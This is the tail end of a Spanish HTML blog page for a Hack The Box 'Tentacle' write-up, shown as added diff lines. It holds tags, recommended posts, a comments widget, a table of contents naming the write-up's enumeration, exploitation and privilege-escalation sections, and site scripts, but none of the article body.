+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/eCPTXv2/">#eCPTXv2</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/htb/">#htb</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/high/">#high</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/dns-enumeration/">#dns_enumeration</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/squid-proxy/">#squid_proxy</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/kerberos/">#kerberos</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/OSCP/">#OSCP</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/dnsenum/">#dnsenum</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/kerbrute/">#kerbrute</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+  <div class="recommended-article px-2 sm:px-6 md:px-8">
+   <div class="recommended-desktop">
+    <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>Artículos recomendados</span>
+    </div>
+    <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/03/25/lab-ejptv2-xerosec/" title="Laboratorio preparatorio ejptv2 | Xerosec" rel="bookmark">
+  <img src="cover-image.png" alt="Laboratorio preparatorio ejptv2 | Xerosec" class="!max-w-none">
+  <span class="title">Laboratorio preparatorio ejptv2 | Xerosec</span>
+</a><a class="recommended-article-item" href="/2024/12/04/Symfonos 1 y 2/" title="Symfonos 1 y 2 | S4vitar | Pivoting I" rel="bookmark">
+  <img src="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/cover-image.png" alt="Symfonos 1 y 2 | S4vitar | Pivoting I" class="!max-w-none">
+  <span class="title">Symfonos 1 y 2 | S4vitar | Pivoting I</span>
+</a><a class="recommended-article-item" href="/2025/01/09/Blue/" title="Blue | WriteUp" rel="bookmark">
+  <img src="https://sergiky.github.io/2025/01/09/Blue/cover_image.png" alt="Blue | WriteUp" class="!max-w-none">
+  <span class="title">Blue | WriteUp</span>
+</a></div>
+   </div>
+   <div class="recommended-mobile">
+   <div class="recommended-article-header text-xl md:text-3xl font-bold mt-10">
+     <i aria-hidden="true"></i><span>Artículos recomendados</span>
+   </div>
+   <div class="recommended-article-group"><a class="recommended-article-item" href="/2025/03/25/lab-ejptv2-xerosec/" title="Laboratorio preparatorio ejptv2 | Xerosec" rel="bookmark">
+  <img src="cover-image.png" alt="Laboratorio preparatorio ejptv2 | Xerosec" class="!max-w-none">
+  <span class="title">Laboratorio preparatorio ejptv2 | Xerosec</span>
+</a><a class="recommended-article-item" href="/2024/12/04/Symfonos 1 y 2/" title="Symfonos 1 y 2 | S4vitar | Pivoting I" rel="bookmark">
+  <img src="https://sergiky.github.io/2024/12/04/Symfonos%201%20y%202/cover-image.png" alt="Symfonos 1 y 2 | S4vitar | Pivoting I" class="!max-w-none">
+  <span class="title">Symfonos 1 y 2 | S4vitar | Pivoting I</span>
+</a></div>
+   </div>
+  </div>
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/03/25/lab-ejptv2-xerosec/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item">Laboratorio preparatorio ejptv2 | Xerosec</span>
+						<span class="post-nav-item">Publicaciones siguientes</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comentarios
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://comments-sergiky.vercel.app',
+          lang: 'en-US',
+          dark: 'body[class~="dark-mode"]',
+          reaction: true,
+          requiredMeta: ['nick', 'mail'],
+          emoji: ['QQ'],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">En esta página</div>
+		<div class="page-title">🐙 Tentacle | WriteUp</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Organizacion"><span class="nav-text">Organización</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reconocimiento"><span class="nav-text">Reconocimiento</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-dns"><span class="nav-text">Enumeración dns</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Ataque-de-transferencia-de-zona"><span class="nav-text">Ataque de transferencia de zona</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#dnsenum"><span class="nav-text">dnsenum</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Enumeracion-Squid-Proxy"><span class="nav-text">Enumeración Squid Proxy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Descubrir-puertos-que-no-se-pueden-ver-desde-el-exterior"><span class="nav-text">Descubrir puertos que no se pueden ver desde el exterior</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Intentar-alcanzar-otras-IPs"><span class="nav-text">Intentar alcanzar otras IPs</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Intentar-alcanzar-otras-IPs-cambiando-al-adaptador-interno"><span class="nav-text">Intentar alcanzar otras IPs cambiando al adaptador interno</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Explotacion"><span class="nav-text">Explotación</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Uso-de-RCE-para-OpenSNMPD"><span class="nav-text">Uso de RCE para OpenSNMPD</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Kerbrute-para-validar-usuarios"><span class="nav-text">Kerbrute para validar usuarios</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Modificacion-del-exploit"><span class="nav-text">Modificación del exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Obteniendo-una-shell"><span class="nav-text">Obteniendo una shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tratamiento-de-la-tty"><span class="nav-text">Tratamiento de la tty</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Escalada-de-privilegios"><span class="nav-text">Escalada de privilegios</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#j-nakazawa-admin"><span class="nav-text">j.nakazawa -&gt; admin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#admin-root"><span class="nav-text">admin -&gt; root</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Fuentes"><span class="nav-text">Fuentes</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Sergiky</a>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">IMPULSADO POR <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">TEMA&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+                
+                
+
+                <li class="right-bottom-tools page-aside-toggle ">
+                        <i class="fa-regular fa-outdent"></i>
+                </li>
+
+                
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="fa-regular fa-arrow-up"></i>
+		</li>
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Buscar..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
